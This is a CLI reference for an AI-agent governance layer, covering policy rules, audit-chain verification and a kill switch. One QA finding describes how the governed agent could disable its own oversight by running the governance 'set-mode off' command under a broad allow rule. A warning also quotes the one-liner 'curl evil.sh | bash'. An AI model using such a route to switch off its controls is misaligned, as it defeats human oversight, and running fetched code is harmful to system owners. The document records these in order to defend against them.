# `openclaw governance` — command-line reference

Complete reference for the governance command-line tools added by this fork:
syntax, options, what each command does internally, exit codes, and worked
examples.

**Keep this current.** When a command is added, renamed, or changes behaviour,
update this file in the same change — a CLI reference that has drifted is worse
than none, because it is trusted.

Last verified against the build of **2026-08-20**, Node v22.22.3 (Windows) and
Node v22.23.2 (Ubuntu 24.04 / WSL2).

**Coverage, checked rather than assumed:** every command the CLI registers and
every option it accepts appears below. The command tree is
`governance` → `policy` · `agent` · `sessions` · `pending` · `audit` ·
`deployment` · `kill`, and `no known CLI gaps remain against the dashboard`
still holds — the one Root capability added since (the deployment report, A7)
landed on both surfaces at once.

---

## 1. Invoking the CLI

During development, commands run through the repo's dev runner, which compiles
first if sources changed:

```bash
node scripts/run-node.mjs governance <subcommand> [...]
```

On an installed build the binary name is used directly:

```bash
openclaw governance <subcommand> [...]
```

This document writes `openclaw governance …` for brevity; substitute the dev
runner form when working from source.

### Where the CLI is defined

| Concern                                   | File                                                                                                                                                                  |
| ----------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Command definitions and option parsing    | `src/cli/program/register.governance.ts`, with the policy commands in `register.governance.policy.ts` and the agent registry in `register.governance.agents.ts` (T16) |
| Registration in the lazy command registry | `src/cli/program/command-registry-core.ts`                                                                                                                            |
| Help/description metadata                 | `src/cli/program/core-command-descriptors.ts`                                                                                                                         |

Commands are registered **lazily**: the registry maps the root command name
`governance` to a module that is only imported when that command is actually
invoked, so adding these did not slow down `openclaw --help` or unrelated
commands.

### What the CLI talks to

The CLI does **not** go through the Gateway's HTTP API. It calls the governance
domain modules directly and reads/writes the same files the Gateway uses:

```
~/.openclaw/governance/
  policy.json          policy document: posture, ask mode, rules, locked agents
  audit-ledger.jsonl   append-only hash-chained decision log
  users.json           dashboard accounts (hashed passwords)
  agents.json          the agent registry: which agents exist, whose they are (M4)
  sessions.json        dashboard login sessions
  rule-requests.json   User-submitted rule requests
```

`OPENCLAW_GOVERNANCE_DIR` overrides that directory. Tests set it so they never
touch real operator state; a deployment can set it to place the ledger on
separate storage.

**Consequence worth knowing:** because the CLI and the Gateway are separate OS
processes writing the same files, every write goes through a cross-process lock
(`src/governance/file-lock.ts`). This is why an earlier version corrupted the
audit chain, and why the CLI is safe to use while the Gateway is running.

### Authorization

The CLI performs **no role check**. It is deliberately an operating-system-level
tool: anyone who can run it already has shell access as the user that owns
`~/.openclaw/`, and could edit those files directly. The four-tier RBAC governs
the **dashboard**, which is reachable over the network; the CLI's boundary is
filesystem permissions (`0700` on the directory, `0600` on files — verified
enforced on Linux).

**Every** change made from the CLI is recorded in the audit ledger with the
actor `cli` — not only kill-switch actions. That covers adding and removing
rules, changing the posture and ask behaviour, the escalation window, per-agent
overrides, and deciding held escalations.

The honest limit: `cli` names the _origin_, not a person. Because the CLI has no
login, there is nobody to authenticate, and a name collected here would be a
claim rather than a fact. So the ledger will tell you a change came from the
terminal on this machine, and not which human typed it. Where that matters, make
the change from the dashboard, which records the account name. (Known limitation
A6 in `mg/REMAINING-WORK.md`.)

#### The consequence that is not about attribution (QA round 13, finding 73)

> **Partly closed.** A core denial now covers `governance <subcommand>`, so the
> _agent_ can no longer reach these commands through a broad allow rule. That
> is a backstop, not the fix: it does nothing about a **person** with shell
> access, which is what the paragraph below is really about, and a CLI login
> remains open work.

The reasoning above — _anyone who can run the CLI could edit the files
directly_ — is sound for a **human** with a shell. It does not hold for the
principal this project exists to constrain.

The governed agent runs on this machine, and `exec` is the tool it uses most.
The core command denial protects the governance **directory**
(`\.openclaw/governance`) and says nothing about the governance **command**. So:

```bash
# Refused: the core denial matches the path
cat ~/.openclaw/governance/policy.json

# Was allowed until QA round 13 — no core denial named it, and one broad
# operator rule was enough. Now refused by a core denial on the subcommand.
node openclaw.mjs governance policy set-mode off
```

Any operator allow-rule wide enough to let the agent build or run the project —
`^(node|npm|npx|pnpm) .*$`, which is the first rule most operators write — makes
the second command reachable. Four spellings were tested against the gate; all
four were allowed. The result is that the agent can disable the entire
governance layer, and the RBAC tiers, the SSH tunnel and the dashboard login are
all bypassed rather than defeated.

This is a **threat-model gap, not a bug in any function**: the design reasoned
carefully about the agent's access to resources and not about the agent's access
to the control plane governing it.

Two fixes, and they were never alternatives so much as stages:

1. **Done** — a core command denial covering `governance` subcommands, matched
   on the **subcommand pair** rather than on the binary name, because the binary
   has many spellings (`openclaw`, `node openclaw.mjs`, `npx openclaw`, a global
   shim) and the subcommand has one. Four spellings are asserted by
   `qa-round13.test.ts`. This restores the property the directory rule was
   written to provide.
2. **Still open** — a CLI login, which would close A6 and this finding together
   and make the sentence at the top of this section true of agents _and_ of
   people. Until then, the honest statement is that the CLI's boundary is
   filesystem permissions, and that this is sound for a human operator and was
   never sound for the agent.

Tracked as Q-73b in `mg/REMAINING-WORK.md` §13c.

---

## 2. Command summary

| Command                                                                          | Purpose                                                                                                                                   |
| -------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `governance policy show`                                                         | Print the policy document                                                                                                                 |
| `governance policy set-mode <mode>`                                              | Set posture: enforce / monitor / off                                                                                                      |
| `governance policy set-ask <mode>`                                               | Set behaviour on an unlisted action                                                                                                       |
| `governance policy add-rule`                                                     | Add a rule that allows or forbids something                                                                                               |
| `governance policy remove-rule <id>`                                             | Remove a rule by id                                                                                                                       |
| `governance policy set-agent-ask <agentId> <mode>`                               | Per-agent override of ask behaviour                                                                                                       |
| `governance login [username]`                                                    | **Sign in.** Command-line changes are then recorded against your account and tier, and your permissions are enforced                      |
| `governance logout`                                                              | End the command-line session (revokes it, not just forgets it)                                                                            |
| `governance whoami`                                                              | Show which account the command line is signed in as                                                                                       |
| `governance policy request-setting <agentId> <ask\|mode> <value> --reason <why>` | **User:** ask an Administrator to change an agent's escalation or posture                                                                 |
| `governance policy core-rules`                                                   | List the shipped core denials and which are switched off                                                                                  |
| `governance policy core-rule <ruleId> <true\|false>`                             | **Root:** switch a core denial off or back on. The three self-protecting rules refuse                                                     |
| `governance set-policy-authoring <userId> <true\|false>`                         | **Root:** allow or withhold a User account's ability to write policy                                                                      |
| `governance policy for-agent <agentId>`                                          | **Agent → policies.** Posture and every rule in force for one agent                                                                       |
| `governance policy rule-agents <ruleId>`                                         | **Policies → agents.** Which agents a rule binds                                                                                          |
| `governance policy set-agent-mode <agentId> <mode>`                              | **Administrator:** per-agent posture: enforce / monitor / default                                                                         |
| `governance policy set-hitl-timeout <seconds>`                                   | How long an escalation waits for a human                                                                                                  |
| `governance agent prompt [--stream] [--attach <path...>] <agentId> <message>`    | Send a prompt to an agent and print the reply. `--attach` sends files; the ledger records hash, type, size and name and **never content** |
| `governance groups unmigrated`                                                   | List accounts written before groups existed, which can no longer sign in                                                                  |
| `governance groups migrate [--delete]`                                           | **Destructive.** Delete every account that predates groups. Reports what would go unless `--delete` is given                              |
| `governance agents list`                                                         | The agent registry for your group, including agents that predate it                                                                       |
| `governance agents register <agentId> <displayName> [--owner <accountId>]`       | **Administrator:** record an agent, owned by you. `--owner` is Root-only                                                                  |
| `governance agents rename <agentId> <displayName>`                               | Rename an agent you own. The id never changes                                                                                             |
| `governance agents set-owner <agentId> <accountId>`                              | Hand an agent to another Administrator, releasing its previous holders                                                                    |
| `governance agents unregister <agentId>`                                         | Remove the record. The agent, its rules and its posture are untouched                                                                     |
| `governance agent transcript <agentId>`                                          | Print this machine's conversation with an agent                                                                                           |
| `governance sessions`                                                            | List currently-running agent sessions                                                                                                     |
| `governance deployment`                                                          | Verify the deployment and network posture                                                                                                 |
| `governance pending list`                                                        | Show timed-out escalations awaiting a decision                                                                                            |
| `governance pending decide <id> --allow\|--deny`                                 | Record a late decision                                                                                                                    |
| `governance audit tail`                                                          | Print recent ledger entries                                                                                                               |
| `governance audit verify`                                                        | Verify the hash chain                                                                                                                     |
| `governance kill <agentId>`                                                      | Engage the kill switch                                                                                                                    |
| `governance kill <agentId> --release`                                            | Release a lockdown                                                                                                                        |

---

## 2b. Groups, and accounts that predate them

Added by M3 (2026-08-24), when the layer stopped assuming one organisation.

**A group is the unit a Root owns** — its Root, its Administrators, its Users and
Viewers. Accounts in different groups never see each other. Creating a Root
creates a group around it, so `governance login` and every account command act
inside the group of whoever is signed in.

Two rules the CLI enforces exactly as the dashboard does, because both go
through the same store rather than through their own copy of the check:

- Every account belongs to exactly one group.
- **Every User and Viewer has one Administrator answerable for it.** Root cannot
  be that Administrator — if Root wants to run a User directly, it creates an
  Administrator account and signs into that.

### `governance groups unmigrated`

Lists accounts created before groups existed. They have no group, and **nothing
can work out which organisation they belonged to** — so rather than guessing,
the layer refuses to let them sign in. The password still verifies; the account
is inert.

```
$ openclaw governance groups unmigrated
2 account(s) predate groups and cannot sign in until removed:
  kinan (root, id user-1754...)
  analyst (viewer, id user-1755...)

Run: openclaw governance groups migrate --delete
```

### `governance groups migrate [--delete]`

Deletes every account with no group. **Without `--delete` it only reports**, and
that is deliberate: this removes credentials and there is no password reset, so
the destructive form has to be typed rather than defaulted into.

It is also deliberately **not** run automatically at load. A migration that
deletes accounts the first time a new build starts is one nobody consented to;
the sign-in refusal is what makes leaving them sitting safe until an operator
decides.

Each deletion is its own ledger entry, naming the account and the reason, since
after this the ledger is the only place that says the account existed.

---

## 2c. The agent registry

Added by M4 (2026-08-24), and it is the change that gives the layer a **noun**
for an agent.

Before it, an agent was not a record. It existed the moment a rule, a posture, a
lockdown or an assignment happened to mention its id, and the set of agents was
reconstructed from whatever the policy document named. That is enough to _judge_
an agent and not enough to own one — there was nothing to name, nothing to hold,
and nothing to list when the honest answer was "none".

A registry entry has four fields: the **id** (the key the host and every rule
use, which never changes), a **display name**, the **group** it belongs to, and
the **one Administrator** answerable for it.

**One authorization rule covers every command here:** registering and changing
agents is the Administrator tier, and an Administrator administers the agents
_they own_. Root is exempt from the ownership half, because Root manages the
people who own agents — without that exemption, an agent whose owning
Administrator has left would be one nobody could ever re-home.

### `governance agents list`

The registry first, and the older reconstruction behind it. Agents that predate
the registry still appear, marked as owned by nobody, so nothing that used to be
listed disappears.

```
$ openclaw governance agents list
  agent-support  "Support triage"  owner user-1755...
  agent-legacy   (not registered — predates the registry, owned by nobody)
```

"No agents are visible to you" is printed in words rather than left as a blank,
because an empty list and a failed request look identical when both render as
nothing.

### `governance agents register <agentId> <displayName>`

Records an agent in your group, owned by you.

**It does not create an agent in OpenClaw.** M6 does that. Registering an id the
host already has is not a mistake in the meantime — it is exactly how an
operator claims the agents an existing installation is already running, which is
the migration path into the registry.

`--owner <accountId>` names somebody else as the owner and is **Root-only**.
Naming who answers for a workload is people management, which is the Root side
of the split this project has drawn since the role model was written.

Ids are unique **per installation, not per group**, and that is a limit rather
than a preference: the id keys the shared policy document, so two groups holding
`main` would mean one group's rules binding the other group's agent. Per-group
policy documents arrive with M5.

### `governance agents rename <agentId> <displayName>`

Changes what the agent is called. The id is untouched, because it is what every
rule, ledger entry and command-line argument refers to.

### `governance agents set-owner <agentId> <accountId>`

Hands the agent to another Administrator — **and releases it from every account
the previous owner had given it to.**

That second half is not tidying. Assignment is constrained to agents your own
Administrator owns, so leaving the old holders in place would leave the account
file stating something the registry contradicts: an invariant that holds at the
moment it is written and rots afterwards.

### `governance agents unregister <agentId>`

Removes the record only. The agent's rules, posture and lockdown all survive,
because the registry never owned those. What it stops being is _owned_ — the id
falls back to the pre-registry state, and every account holding it is released.

The ledger entry keeps the name and the owner, because after this the record is
gone and the ledger is the only place that says the agent was ever owned.

### What this changes about assignment

`users/agents` — assigning agents to an account — now refuses an agent belonging
to a different Administrator. Three outcomes:

| The agent is…                                    | Assignment |
| ------------------------------------------------ | ---------- |
| registered, owned by the account's Administrator | allowed    |
| not registered at all                            | allowed    |
| registered to somebody else                      | refused    |

**The middle row is the honest limit.** An unregistered id is still assignable,
so the constraint can be sidestepped by not registering — which makes the
registry a statement of ownership rather than a gate on it. Refusing
unregistered ids would break assignment on every installation that upgrades into
M4, and would buy nothing: an agent nobody has claimed cannot be stolen from an
owner who does not exist. Closing it needs registration to be mandatory, which
needs M6's provisioning first.

---

## 3. Policy commands

### `governance policy show`

Prints the whole policy document as JSON.

```bash
openclaw governance policy show
```

```json
{
  "version": 1,
  "mode": "enforce",
  "ask": "on-miss",
  "rules": [
    {
      "id": "command-1786222746899-rm01ix",
      "createdAt": "2026-08-08T20:59:06.899Z",
      "resourceKind": "command",
      "pattern": "^ls( .*)?$",
      "description": "allow ls"
    }
  ],
  "lockedAgents": []
}
```

_Internally:_ `loadPolicy()` reads `policy.json`, merging it over the defaults
so a file written by an older build (missing a newer field) still loads rather
than producing `undefined` in a permission check.

**Exit code:** `0` always, including when no policy file exists yet — the
defaults are printed instead.

### `governance policy set-mode <mode>`

Sets the enforcement posture. `<mode>` is one of:

| Mode      | Behaviour                                                                                                                                                      |
| --------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `enforce` | The gate is live: unlisted actions are blocked or escalated                                                                                                    |
| `monitor` | Decisions are recorded but **never** block. The ledger records the verdict that _would_ have applied, so a dry run predicts the effect of switching to enforce |
| `off`     | The gate abstains entirely and nothing is recorded                                                                                                             |

```bash
openclaw governance policy set-mode monitor
```

**Exit code:** `0` on success; a thrown validation error (non-zero) for an
unrecognised mode.

### `governance policy set-ask <mode>`

Controls what happens when a governed action matches no rule.

| Mode      | Behaviour                                                                                                                               |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| `on-miss` | Pause and request human approval, routed into OpenClaw's existing approval flow. An `allow-always` answer is written back as a new rule |
| `off`     | Deny outright — strict default-deny                                                                                                     |

```bash
openclaw governance policy set-ask off
```

### `governance policy add-rule`

Adds a rule that allows or forbids something.

```
openclaw governance policy add-rule
  --kind <command|path|network>   (required)
  --pattern <regex>               (required)
  [--effect <allow|deny>]
  [--access <read|write>]
  [--description <text>]
  [--ttl-minutes <n>]
  [--agent <agentId>]
```

| Option          | Meaning                                                                                                          |
| --------------- | ---------------------------------------------------------------------------------------------------------------- |
| `--kind`        | Which resource family the rule matches                                                                           |
| `--pattern`     | A JavaScript regular expression tested against the extracted resource                                            |
| `--effect`      | `allow` (default) or `deny`. A deny rule is evaluated **before** every allowance and cannot be overridden by one |
| `--access`      | **Path rules only**: `read` or `write`. Omit to cover both directions                                            |
| `--description` | Free text shown in the dashboard                                                                                 |
| `--ttl-minutes` | Expire the rule after N minutes. **Omit for an indefinite rule that never expires**                              |
| `--agent`       | Scope the rule to one agent. Omit for a global rule binding every agent                                          |

What each `--kind` is matched against:

| Kind      | Governed tools                                                              | Matched string                                                  |
| --------- | --------------------------------------------------------------------------- | --------------------------------------------------------------- |
| `command` | `exec`, `bash`, `terminal` (its `command` and `data`)                       | the full command line                                           |
| `path`    | `read`, `grep`, `find`, `ls` (read); `write`, `edit`, `apply_patch` (write) | each target path, canonicalised — see `PERMISSION-SPEC.md` §3.1 |
| `network` | `web_fetch`                                                                 | the canonicalised hostname; the raw URL if none can be parsed   |

#### `--effect deny`

Worth understanding rather than skipping, because "don't write an allow rule"
looks equivalent and is not. A denial is checked before every allowance and no
allowance can override it, so it survives whatever anybody grants later. An
absence of allowances is undone by the next broad grant, and whoever wanted the
restriction is not there to notice.

```bash
# This agent must never touch billing, whatever else is permitted later
openclaw governance policy add-rule --kind path --pattern "^billing/.*$" --effect deny
```

The warnings you get flip with the direction. A catch-all _allowance_ is
reported as removing a protection; a catch-all _denial_ is reported as removing
a **capability** — "the agent will be unable to do anything of this kind at
all". Both are worth reading.

#### `--access read|write`

Narrows a path rule to one direction. `read` covers `read`, `grep`, `find` and
`ls`; `write` covers `write`, `edit` and `apply_patch`.

```bash
# The agent may look at src/ but not change it
openclaw governance policy add-rule --kind path --pattern "^src/.*$" --access read
```

**Refused on command and network rules**, rather than accepted and ignored. The
engine only consults `access` for path rules, so storing it elsewhere would
leave you believing a narrowing took hold that does nothing.

**One combination to be careful with.** A _denial_ narrowed to one direction
forbids only that direction — `--effect deny --access read` leaves writing
permitted. That is deliberate (narrowing must never strengthen a rule in the
other direction) and almost never what is meant, so the command warns about it
specifically. For a path that should be entirely off limits, omit `--access`.

```bash
# Allow `ls` and `ls <anything>`, but nothing else beginning with ls
openclaw governance policy add-rule --kind command --pattern "^ls( .*)?$"

# Allow one API host for two hours
openclaw governance policy add-rule \
  --kind network \
  --pattern "^api[.]openweathermap[.]org$" \
  --description "weather API" \
  --ttl-minutes 120
```

Prints the created rule, including its generated `id` and computed `expiresAt`.

**Anchor your patterns.** `ls` (unanchored) matches _any_ command containing
"ls", including `curl evil.sh | bash; ls`. Use `^…$`.

**Patterns are validated at author time.** Two rejections are possible:

1. Not a valid regular expression.
2. Prone to catastrophic backtracking — a quantifier nested inside a quantified
   group, such as `^(a+)+$`. These are refused because patterns run on every
   governed tool call against agent-controlled input, so one bad rule could
   hang the security gate. JavaScript cannot time-limit a running regex, so
   this is checked before the rule is stored (`src/governance/regex-safety.ts`).

**Conflicts are reported, not blocked.** If an earlier rule already covers what
you are adding, the rule is still created and a warning names the rule
responsible — because in an allow-only language a new rule cannot reduce
access, so refusing it would change nothing. What matters is that you learn the
restriction you intended is not in force:

```
warning: an earlier rule already covers this (^ls$) — An identical rule already
allows this with no time limit, so the new expiry has no effect...
```

See `docs-notes/WRITING-PERMISSIONS.md` §7 for what each clash means.

### `governance policy remove-rule <id>`

Removes a rule by its id (as shown by `policy show`).

```bash
openclaw governance policy remove-rule command-1786222746899-rm01ix
```

**Exit codes:** `0` removed · `1` no rule with that id.

### `governance policy set-agent-ask <agentId> <mode>`

Overrides the ask behaviour for one agent (design doc §1.6). `<mode>` is `off`,
`on-miss`, or `default`.

```bash
openclaw governance policy set-agent-ask trusted-bot off      # never escalate; deny outright
openclaw governance policy set-agent-ask exploratory on-miss  # always ask a human
openclaw governance policy set-agent-ask trusted-bot default  # follow the installation setting
```

`default` **clears** the override rather than pinning the current value — a
cleared agent follows future changes to the installation default, a pinned one
would not.

### `governance policy set-agent-mode <agentId> <mode>`

Switches one agent's posture, so its behaviour can be observed without acting on
the verdicts. `<mode>` is `enforce`, `monitor`, or `default`. **`monitor` is
opt-in and off by default** — the installation ships `enforce` with a baseline
ruleset, and this is the switch for observing one agent rather than enforcing on
it.

### Reading the policy in both directions

`governance policy show` prints the document, which is what has been _written_.
Neither of the questions an operator actually has can be read off it by eye,
because a rule with no `agentId` binds every agent rather than none:

```
governance policy for-agent build-bot     # what is in force for this agent
governance policy rule-agents rule-a1b2   # which agents does this rule bind
```

`for-agent` prints the effective posture (marking whether it is the
installation default or an override), whether the kill switch is engaged, and
every rule in force — each tagged `global` or `agent` so it is clear whether
removing it would affect one workload or all of them.

`rule-agents` leads with the fact that a rule is global _before_ listing the
agents it currently binds, because a global rule also binds every agent created
tomorrow, and a list read first invites the wrong conclusion.

```bash
openclaw governance policy set-agent-mode exploratory monitor  # watch, do not block
openclaw governance policy set-agent-mode exploratory enforce  # pin this agent to enforce
openclaw governance policy set-agent-mode exploratory default  # follow the installation posture
```

This is how monitor mode is meant to be used: point it at one agent, let it run
its real work, read the `deny` and `ask` entries out of the ledger, and promote
the ones that turn out to be legitimate into rules. The rest of the installation
keeps enforcing throughout.

**`off` is refused here, deliberately, and there is no flag to force it.** A
per-agent `off` is not a weaker posture — it is the absence of the gate. The
engine returns before the lockdown check, so that agent stops being covered by
the kill switch and by the core denials as well as by ordinary rules, and no
ledger entry records that it happened. Since a User may set this for an agent
assigned to them, accepting `off` would make "switch off every protection on my
own agent" one command. To switch the gate off, use
`governance policy set-mode off`, which is installation-wide, Administrator-level
and audited as one visible act.

Same control on the dashboard: **Settings → Governance → Observe one agent**.

**Exit codes:** `0` set or cleared · `1` invalid posture.

### `governance policy set-hitl-timeout <seconds>`

How long an escalation waits for a human before timing out. Accepts 5–86400.

```bash
openclaw governance policy set-hitl-timeout 600
```

On timeout the action is **denied** — never allowed — and the question is
pushed onto the pending-decision stack. Timing out into "allow" would let an
unattended installation decay into no governance at all.

---

## 3b. Talking to an agent

### `governance agent prompt <agentId> <message...>`

Sends a prompt to an agent and prints the reply. The message is taken as the
rest of the line, so it does not need quoting.

```bash
openclaw governance agent prompt research-bot summarise the readme
openclaw governance agent prompt --stream research-bot review the diff
openclaw governance agent transcript research-bot
```

The run is OpenClaw's ordinary agent run, so **every tool call it makes is still
checked against your policy** — prompting gives the agent nothing new, only a way
for you to ask. A locked-down agent refuses the prompt outright; release it
first.

**`--stream`** prints the reply as the agent produces it instead of all at once
when it finishes. Off by default on purpose: a terminal is often reading into a
pipe or a file, where a reply printed progressively stops being the reply. Turn
it on when you are watching a long task by hand.

**Stopping a run.** Press Ctrl-C. That cancels the agent run itself, not just
the printout, and the cancellation is recorded.

There is deliberately **no `governance agent cancel` command.** The table of
in-flight prompts lives inside the process running them, and this command runs
the agent in its own — so such a command could only ever stop a run started in
the same terminal, and one that looked like it could reach the Gateway's runs
would be reporting a power it does not have. Use the dashboard to stop a prompt
somebody else started, or one whose terminal is gone.

**Limits that apply here too.** A prompt is stopped after five minutes, and each
account may have two running at once (six across the installation). The CLI
counts as the account `cli`, so several terminals share one allowance.

**Attribution caveat.** The CLI has no login, so a prompt sent from a terminal
is recorded in the ledger against `cli` rather than a person (known limitation
A6). The dashboard is the surface that answers "who asked" — sign in there when
that matters.

**Exit codes:** `0` the run completed · `1` the run failed or was refused.

### `governance agent transcript <agentId>`

Prints the conversation this machine has had with an agent, oldest turn first.
Accepts `--limit <n>` (default 50).

Conversations are kept per (agent, account), so this shows the `cli` thread —
not what a User has said to the same agent from the dashboard. That separation
is deliberate: two operators sharing an agent must not read each other's
prompts.

Same capability on the dashboard: **Settings → Governance → Your agents**.

---

## 3c. Deployment oversight

### `governance deployment`

Reads the live deployment and reports whether it matches the architecture the
design specifies. Read-only — it changes nothing.

```bash
openclaw governance deployment
openclaw governance deployment --json
openclaw governance deployment --strict
```

| Option     | Effect                                                     |
| ---------- | ---------------------------------------------------------- |
| `--json`   | Print the whole report as JSON, for a provisioning script  |
| `--strict` | Exit 1 when any check has failed. Default is always exit 0 |

**Why this exists on the command line and not only on the dashboard.** The
design has the dashboard reachable only through an SSH local port forward. So
the moment you most need to know whether the listener is exposed is over a plain
SSH session _before_ any tunnel exists — exactly when the dashboard is, by
design, unreachable. This is the surface that works then, and it is the one to
run first on a new VPS.

**Why `--strict` is opt-in.** On a developer machine the platform check warns
(it is not Linux) and the permission checks report that POSIX mode bits are not
meaningful. A command that exits non-zero on every workstation is a command
people learn to ignore, so the default is exit 0 and `--strict` is for the
provisioning script that genuinely wants to fail the build.

Sample output:

```
platform      linux · 8.4 GB total
gateway       loopback:18789 · auth token
governance    ~/.openclaw/governance

[pass] deployment.bind_loopback
         The Gateway binds to loopback, so it is not reachable from another host directly.
[pass] deployment.tunnel_required
         No route to the dashboard exists from another host except a local port forward.
[warn] deployment.ledger_key_source
         The ledger key is stored on the same host as the ledger it protects, so an
         attacker with full filesystem access can still forge the chain.
         -> Supply the key through OPENCLAW_GOVERNANCE_LEDGER_KEY from a secret store.

0 failed · 1 warnings · 0 not determined here · 10 passed
```

**Four statuses, and `unknown` is not a synonym for `pass`.** A check that could
not run here — POSIX permissions on Windows, free space where `statfs` is
unavailable — reports `unknown` rather than quietly going green. A verification
report that shows a clean result because the detector was disconnected is worse
than no report, because somebody will act on it. `unknown` is counted and
displayed separately, and it is excluded from the overall verdict so that
"three things could not be checked here" cannot turn a sound deployment amber
either.

The same report is available to **Root** on the dashboard. The tier is enforced
server-side; the CLI has no login and reports with full visibility, because its
boundary is filesystem access rather than RBAC — see §1 above.

---

## 4. Session and pending-decision commands

### `governance sessions`

Lists agent sessions currently running.

```bash
openclaw governance sessions
```

Only meaningful **inside the Gateway process**, which owns the run registry.
From the CLI you will normally see:

```
live session view unavailable: the Gateway owns the run registry, so this only
works from inside it
```

Use the dashboard (**Settings → Governance → Active agent sessions**) for the
live view.

### `governance pending list`

Shows escalations that timed out before anyone answered, newest first.

```bash
openclaw governance pending list
```

### `governance pending decide <id> --allow|--deny`

Records a late judgement on a timed-out escalation.

```bash
openclaw governance pending decide pend-1786402739895-4p17nn --allow
```

**This does not resurrect the blocked action** — that turn finished long ago.
It records your judgement, and an `--allow` is your cue to add a rule so the
next attempt succeeds. The command says so explicitly rather than implying the
agent resumed.

**Exit codes:** `0` recorded · `1` no pending decision with that id.

---

## 5. Audit commands

### `governance audit tail`

Prints the most recent ledger entries as JSON.

```
openclaw governance audit tail [--limit <n>]   # default 50
```

```bash
openclaw governance audit tail --limit 20
```

The ledger holds two kinds of entry in one chain. **Agent activity** carries no
`entryKind`. A **policy or account change** carries `"entryKind": "admin"` and an
`"actor"` naming who made it. To read only the administrative trail:

```bash
openclaw governance audit tail --limit 200 | jq '.[] | select(.entryKind == "admin")'
```

To ask who last touched the rules:

```bash
openclaw governance audit tail --limit 200 | jq -r '.[] | select(.entryKind == "admin") | "\(.timestamp) \(.actor) \(.toolName) \(.resource)"'
```

The same split is available in the dashboard as the **Policy changes** filter on
the audit section, which needs no `jq`.

Each entry:

| Field                                  | Meaning                                               |
| -------------------------------------- | ----------------------------------------------------- |
| `seq`                                  | Strictly increasing. A gap is tampering evidence      |
| `timestamp`                            | ISO 8601, when the decision was made                  |
| `agentId`, `sessionKey`                | Which agent and session acted                         |
| `toolName`, `resourceKind`, `resource` | What was attempted (secrets already redacted)         |
| `ruleId`                               | Which rule decided, or `default-deny` / `kill-switch` |
| `decision`                             | `allow`, `deny`, or `ask`                             |
| `prevHash`, `hash`                     | The chain link and this entry's own SHA-256           |

_Internally:_ reads the JSONL file and returns the last N well-formed entries.
Malformed lines are skipped here (they are reported by `verify`, whose job it
is to notice them).

### `governance audit verify`

Recomputes the hash chain from the beginning and reports the first entry that
does not match.

```bash
openclaw governance audit verify
```

Clean:

```json
{ "ok": true, "entriesChecked": 8 }
```

Tampered:

```json
{
  "ok": false,
  "entriesChecked": 3,
  "brokenAtSeq": 3,
  "reason": "entry hash does not match its own recomputed content hash"
}
```

Possible `reason` values:

| Reason                                                      | What it means                                                  |
| ----------------------------------------------------------- | -------------------------------------------------------------- |
| `entry hash does not match its own recomputed content hash` | The entry's content was edited                                 |
| `prevHash does not match the preceding entry's hash`        | The chain was broken — typically an entry removed or reordered |
| `unexpected sequence number (expected N)`                   | A gap: an entry was deleted                                    |
| `line N: entry is not valid JSON` / `is missing seq/hash`   | Corruption or injected content                                 |

**Exit codes:** `0` chain intact · `1` verification failed. Suitable for a cron
job or monitoring check.

**Known limitation:** chaining detects any edit or deletion _within_ the log,
but not truncation of the newest entries, because a prefix of a valid chain is
itself a valid chain. Detecting that needs an external anchor (a counter-signed
checkpoint, or an off-host copy of the latest hash).

---

## 6. Kill switch

### `governance kill <agentId>`

Engages the emergency stop for one agent (design requirement #7).

```
openclaw governance kill <agentId> [--release]
```

```bash
openclaw governance kill main
```

```
governance lockdown engaged for agent "main" in 12.4ms
no in-flight termination available from the CLI (the Gateway owns the run registry)
```

Two things happen, in this order:

1. **Lockdown** — the agent id is written to `policy.json`. The policy engine
   then denies every subsequent governed action from that agent, checked
   _before_ any allow rule, so an allowlisted command is refused too.
2. **Termination** — in-flight runs are signalled to abort. This works when the
   **Gateway** performs it, because the Gateway owns the live run registry and
   registers the abort implementation at startup
   (`src/gateway/governance-agent-termination.ts`). From the CLI — a separate
   process with no registry — the message above is printed instead of implying
   something was stopped.

Ordering is deliberate: locking first closes the window in which the agent
could legally start a fresh action between the abort and the lock landing.

The elapsed time printed is the measured wall-clock duration of the whole
operation, which is the evidence for requirement #7's one-second bound.

To stop an in-flight run, use the dashboard (**Settings → Governance →
Emergency kill switch**), which runs inside the Gateway.

### `governance kill <agentId> --release`

Releases the lockdown. Does **not** restart anything that was aborted.

```bash
openclaw governance kill main --release
```

Both actions are written to the audit ledger with actor `cli`.

---

## 7. Worked example — a full session

```bash
# 1. See where things stand
openclaw governance policy show

# 2. Strict default-deny while we tighten the rules
openclaw governance policy set-mode enforce
openclaw governance policy set-ask off

# 3. Allow exactly what the agent legitimately needs
openclaw governance policy add-rule --kind command --pattern "^ls( .*)?$"
openclaw governance policy add-rule --kind path    --pattern "^workspace/.*$"
openclaw governance policy add-rule --kind network --pattern "^api[.]example[.]com$"

# 4. Watch what the agent actually attempts
openclaw governance audit tail --limit 30

# 5. Prove the record has not been altered
openclaw governance audit verify

# 6. Something looks wrong — stop the agent
openclaw governance kill main

# 7. After investigating, resume
openclaw governance kill main --release
```

A safer rollout is to run `set-mode monitor` first: decisions are recorded with
the verdict that _would_ have applied, so `audit tail` shows exactly what
enforcing would have blocked before anything is actually blocked.

---

## 8. Exit codes

| Code              | Meaning                                                                                                        |
| ----------------- | -------------------------------------------------------------------------------------------------------------- |
| `0`               | Success                                                                                                        |
| `1`               | The operation completed but the answer was negative: rule id not found, or the audit chain failed verification |
| non-zero (thrown) | Invalid argument, e.g. an unrecognised mode or resource kind                                                   |

---

## 9. Scripts

| Script                               | Purpose                                                                                                                                                                  |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `start-governance.ps1`               | Starts the fork's Gateway on port 18799 and opens the dashboard (Windows)                                                                                                |
| `scripts/governance-linux-check.mjs` | Linux platform verification (requirement #9) — file locking, POSIX permissions, path handling, hashing, authorization rules. Runs on plain `node`, no dependency install |
| `scripts/ts-extension-resolver.mjs`  | ESM resolver mapping `./x.js` specifiers to `./x.ts`, so the Linux check runs against the real source without a build                                                    |

```bash
# Linux verification
node --import ./scripts/register-ts-resolver.mjs scripts/governance-linux-check.mjs
```

---

## 10. Change log for this reference

| Date       | Change                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
